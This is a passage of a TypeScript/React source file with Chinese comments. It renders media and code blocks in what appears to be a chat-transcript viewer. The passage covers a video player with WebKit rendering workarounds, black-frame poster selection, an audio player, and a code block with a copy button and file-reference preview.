 * 封面不用 video 的 poster 属性，而是自己盖一层图：WebKit 带着 poster
 * 时会推迟建视频图层，拖进度条（没点播放）会把 poster 撤掉却画不出那一帧
 * —— 暂停时整块空着。盖层只管「开播之前」，点一下就撤。
 */
function VideoPlayer({
  src,
  path,
  name,
  poster,
  started,
  onStart,
}: {
  src: string;
  path: string;
  name: string;
  poster: Poster | null;
  started: boolean;
  onStart: () => void;
}) {
  const { t } = useT();
  /** 在对话流里占位的外层。全屏时它留在原地、钉住高度（见 useVideoFullscreen）。 */
  const wrapRef = useRef<HTMLSpanElement>(null);
  /** 真正进全屏的那一层：画面 + 控件。 */
  const stageRef = useRef<HTMLSpanElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const media = useMediaPlayback(videoRef, src);
  /**
   * 暂停那一帧的截图（data URL）。null = 没暂停过 / 正在放。
   *
   * WKWebView 里暂停着的视频，合成图层一旦被丢掉就不再重画：切走会话再
   * 切回（整个对话面板走 content-visibility）、暂停中拖进度条，画面都会
   * 整块变黑。早先的办法是把视频 display:none 一帧逼它重建图层，但切换
   * 会话那条路上没人去触发，而且重建本身也闪一下。截一张图盖上去是普通
   * 图片，任何时候都画得出来；开播就撤掉。
   */
  const [still, setStill] = useState<string | null>(null);
  const { fullscreen, filled, toggle: toggleFullscreen } = useVideoFullscreen(wrapRef, stageRef, videoRef);

  const cover = poster && !started ? poster : null;
  return (
    <span
      ref={wrapRef}
      className="md-video-wrap"
      // 显示宽度给外框（它的百分比相对正文列，解析得出来），视频铺满外框、
      // 按比例算高。宽度挂在视频上的话外框是 fit-content，两边互相依赖，
      // 元数据到之前按默认的 300px 算，先窄后宽地跳一下。
      {...(poster ? { style: videoBoxStyle(poster) } : {})}
      {...(media.playing ? { "data-playing": "" } : {})}
    >
      <span ref={stageRef} className={filled ? "md-video-stage is-filled" : "md-video-stage"}>
        <video
          ref={videoRef}
          className="md-video"
          src={src}
          preload="metadata"
          playsInline
          title={path}
          // 一开始就按封面的比例和最终显示尺寸占位：元数据到之前播放器按
          // 300×150 占位，盖层会先缩成一小块再撑开。
          //
          // `[约束]` 用样式（aspect-ratio + 算好的宽度）而不是 width/height
          // 属性。属性会成为视频的固有尺寸（1920×1080 这种），WebKit 进出
          // 全屏时按它重建视频图层，画面和外框错开一截、看着像重新加载了
          // 一下 —— 没挑出封面（黑场、不写属性）的视频就没这个问题。
          {...(poster ? { style: { width: "100%", height: "auto", aspectRatio: `${poster.w} / ${poster.h}` } } : {})}
          {...media.handlers}
          onClick={media.toggle}
          onPlay={(e) => {
            media.handlers.onPlay(e);
            // 用键盘、画中画之类绕过盖层开播的，盖层也跟着撤。
            onStart();
          }}
          onPause={(e) => {
            media.handlers.onPause(e);
            setStill(stillFrame(e.currentTarget));
          }}
          onSeeked={(e) => {
            if (e.currentTarget.paused) setStill(stillFrame(e.currentTarget));
          }}
        >
          {name}
        </video>
        {/* 暂停画面：截下来的当前帧盖在视频上，开播就撤（见 stillFrame）。 */}
        {still && !media.playing ? (
          <img className="md-video-still" src={still} alt="" draggable={false} />
        ) : null}
        {cover ? (
          <button
            type="button"
            className="md-video-cover"
            aria-label={t("transcript.md.playVideo", { name })}
            title={path}
            // 在点击里直接 play()：用户手势还在，有声播放不会被拦。
            onClick={() => {
              onStart();
              void videoRef.current?.play().catch(() => {});
            }}
          >
            <img src={cover.src} alt="" draggable={false} />
            <span className="md-video-play" aria-hidden>
              <svg viewBox="0 0 24 24" width="22" height="22">
                <path d="M8 5.5v13l10.5-6.5z" fill="currentColor" />
              </svg>
            </span>
          </button>
        ) : (
          <span className="md-video-controls">
            <MediaBar
              media={media}
              enabled
              label={name}
              extra={
                <>
                  <button
                    type="button"
                    className="media-btn"
                    onClick={() => {
                      if (videoRef.current) videoRef.current.muted = !videoRef.current.muted;
                    }}
                    aria-label={media.muted ? t("transcript.md.videoUnmute") : t("transcript.md.videoMute")}
                    title={media.muted ? t("transcript.md.videoUnmute") : t("transcript.md.videoMute")}
                  >
                    <VolumeGlyph muted={media.muted} />
                  </button>
                  <button
                    type="button"
                    className="media-btn"
                    onClick={toggleFullscreen}
                    aria-label={
                      fullscreen ? t("transcript.md.videoExitFullscreen") : t("transcript.md.videoFullscreen")
                    }
                    title={fullscreen ? t("transcript.md.videoExitFullscreen") : t("transcript.md.videoFullscreen")}
                  >
                    <FullscreenGlyph exit={fullscreen} />
                  </button>
                </>
              }
            />
          </span>
        )}
      </span>
    </span>
  );
}

/**
 * 截下视频此刻的画面（暂停时盖在视频上，见 VideoPlayer 的 still）。按显示
 * 需要缩到最宽 1280，JPEG —— 原尺寸 1080p 的 PNG 白占内存。解不出画面
 * （还没解出首帧）返回 null，那就不盖。
 */
function stillFrame(v: HTMLVideoElement): string | null {
  const w = v.videoWidth;
  const h = v.videoHeight;
  if (!w || !h) return null;
  const scale = Math.min(1, 1280 / w);
  const canvas = document.createElement("canvas");
  canvas.width = Math.round(w * scale);
  canvas.height = Math.round(h * scale);
  const ctx = canvas.getContext("2d");
  if (!ctx) return null;
  try {
    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL("image/jpeg", 0.85);
  } catch {
    return null;
  }
}

/** 视频最高这么高（和 styles.css 的 .md-video 一致）。 */
const VIDEO_MAX_H = 480;

/**
 * 按封面量出的原始尺寸给播放器定显示框：比例照原片，宽度不超过原片、
 * 不超过 VIDEO_MAX_H 对应的宽度、不超过容器。
 */
function videoBoxStyle(p: Poster): React.CSSProperties {
  const w = Math.min(p.w, (VIDEO_MAX_H * p.w) / p.h);
  return { width: `min(100%, ${Math.round(w)}px)` };
}

/**
 * 磁盘上的一段音频：文件名 + 原生播放条。
 *
 * 读法和视频一样（readFileBytes → blob，网页版也通），受同一个 32 MB 预览
 * 上限；读不到退回文件链接（`plain`，不再绕回这里），点开交给系统播放器。
 */
function LocalAudio({ path, mime, alt }: { path: string; mime: string; alt: string }) {
  const { t } = useT();
  const { src, failed } = useFileBlob(path, mime);
  const name = alt || basename(path);

  if (failed) {
    return (
      <span className="md-img-broken">
        <MdLink href={toFileHref(path)} plain>
          {name}
        </MdLink>
        <span className="md-link-err" role="status">
          {t("transcript.md.audioUnavailable")}
        </span>
      </span>
    );
  }
  // 播放条自己画（见 AudioPlayer）：原生 <audio controls> 在 WebKit 里切换
  // 会话时会当场重排。文件还没读进来时画同尺寸的禁用态，不跳。
  return (
    <span className="md-audio" title={path}>
      <span className="md-audio-name">{name}</span>
      <AudioPlayer src={src} label={name} />
    </span>
  );
}

/** 挑出来的封面：图和视频的原始尺寸（给播放器定比例）。 */
type Poster = { src: string; w: number; h: number };

/**
 * 给视频挑一帧当封面。
 *
 * 不设封面时播放器显示第一帧，而片子大多是黑场淡入 —— 一整块黑，
 * 看不出是什么。依次试几个时间点，取第一张不是黑场的；都偏暗就用
 * 最后一张。在一个离屏的 video 上 seek 再画到 canvas，不碰页面上那个。
 * 解不开、跨不过去就返回 undefined，播放器照常用第一帧。
 */
async function posterOf(src: string): Promise<Poster | undefined> {
  const v = document.createElement("video");
  v.muted = true;
  v.preload = "auto";
  v.src = src;
  const once = (ev: string) =>
    new Promise<boolean>((resolve) => {
      const ok = () => resolve(true);
      v.addEventListener(ev, ok, { once: true });
      v.addEventListener("error", () => resolve(false), { once: true });
      window.setTimeout(() => resolve(false), 5000);
    });
  try {
    if (!(await once("loadeddata"))) return undefined;
    const d = Number.isFinite(v.duration) ? v.duration : 0;
    const w = v.videoWidth;
    const h = v.videoHeight;
    if (!w || !h) return undefined;
    // 封面按显示尺寸画就够，原尺寸 1080p 转 JPEG 白占内存。
    const scale = Math.min(1, 960 / w);
    const canvas = document.createElement("canvas");
    canvas.width = Math.round(w * scale);
    canvas.height = Math.round(h * scale);
    const ctx = canvas.getContext("2d", { willReadFrequently: true });
    if (!ctx) return undefined;
    let last: string | undefined;
    for (const t of [Math.min(1, d * 0.1), Math.min(3, d * 0.2), d * 0.5]) {
      v.currentTime = t;
      if (!(await once("seeked"))) break;
      ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
      last = canvas.toDataURL("image/jpeg", 0.85);
      if (brightness(ctx, canvas.width, canvas.height) > 0.08) return { src: last, w, h };
    }
    return last ? { src: last, w, h } : undefined;
  } catch {
    return undefined;
  } finally {
    v.removeAttribute("src");
    v.load();
  }
}

/** 画面平均亮度（0–1），隔点取样。判黑场用，不求精确。 */
function brightness(ctx: CanvasRenderingContext2D, w: number, h: number): number {
  const data = ctx.getImageData(0, 0, w, h).data;
  let sum = 0;
  let n = 0;
  for (let i = 0; i < data.length; i += 4 * 97) {
    sum += 0.2126 * data[i]! + 0.7152 * data[i + 1]! + 0.0722 * data[i + 2]!;
    n++;
  }
  return n ? sum / n / 255 : 0;
}

/** 代码块：语言标签（或代码引用的路径）+ 复制按钮。 */
function CodeBlock({
  node: _node,
  ...props
}: React.HTMLAttributes<HTMLPreElement> & { node?: unknown }) {
  const { t } = useT();
  const [copied, flashCopied] = useTimedFlag<"idle" | "ok" | "fail">("idle", 1500);
  const root = useContext(ProjectRootContext);

  const child = props.children as React.ReactElement<
    { className?: string; children?: React.ReactNode } & Record<string, unknown>
  > | null;
  const lang =
    child?.props?.className
      ?.split(" ")
      .find((c) => c.startsWith("language-"))
      ?.slice("language-".length) ?? "";

  // remarkCodeRefs 把引用信息挂成 data 属性，落在内层 <code> 上
  // （见那个插件的说明）。
  const attrs = child?.props ?? {};
  const str = (k: string) => (typeof attrs[k] === "string" ? attrs[k] : "");
  const refPath = str("data-ref-path");
  const refStart = str("data-ref-start");
  const refEnd = str("data-ref-end");

  const copy = () => {
    const text = extractText(child?.props?.children);
    // 剪贴板在窗口失焦等情况下会拒绝 —— 失败还报"已复制"等于骗人
    navigator.clipboard.writeText(text).then(
      () => flashCopied("ok"),
      () => flashCopied("fail"),
    );
  };

  // 和聊天里其它文件引用一样进应用内预览（openFilePreview 按类型分流），
  // 不直接交给系统默认应用 —— xml 这类在 Windows 上没有关联应用，点一下
  // 弹出系统的"选择应用"框。读不到的错误由预览面板报。
  const openRef = () => {
    // 绝对路径认盘符和 UNC（`D:/…`、`\\server\…`），不能只看 `/` 开头 ——
    // 否则 Windows 上 `D:/…` 被拼到项目根后面，成了不存在的路径。
    const full = looksAbsPath(refPath) || !root ? refPath : joinRoot(root, refPath);
    openFilePreview(full);
  };

  const lines = refStart === refEnd ? `${refStart}` : `${refStart}-${refEnd}`;
  const source = extractText(child?.props?.children);

  if (lang === "mermaid") {
    return <MermaidBlock source={source} />;
  }

  return (
    <div className={refPath ? "codeblock is-ref" : "codeblock"}>
      <div className="codeblock-bar">
        {refPath ? (
          <>
            <button
              type="button"
              className="codeblock-ref"
              // 相对路径以项目根为基准。模型偶尔会写绝对路径，那时直接用。
              onClick={openRef}
              title={t("transcript.md.previewRef", { path: refPath })}
            >
              <span className="codeblock-ref-path">{refPath}</span>
              <span className="codeblock-ref-lines">:{lines}</span>
            </button>
          </>
        ) : (
          <span className="codeblock-lang">{lang}</span>
        )}
        <button type="button" className="codeblock-copy" onClick={copy}>
          {copied === "ok"
            ? t("common.copied")
            : copied === "fail"
              ? t("transcript.md.copyFailed")
              : t("common.copy")}
        </button>
      </div>
      <pre {...props} />
    </div>
  );
}

/** 从 React 节点树里抠出纯文本。高亮后的代码是嵌套 span，得递归。 */
function extractText(node: React.ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(extractText).join("");
  if (typeof node === "object" && "props" in node) {
    return extractText((node.props as { children?: React.ReactNode }).children);
  }
  return "";
}
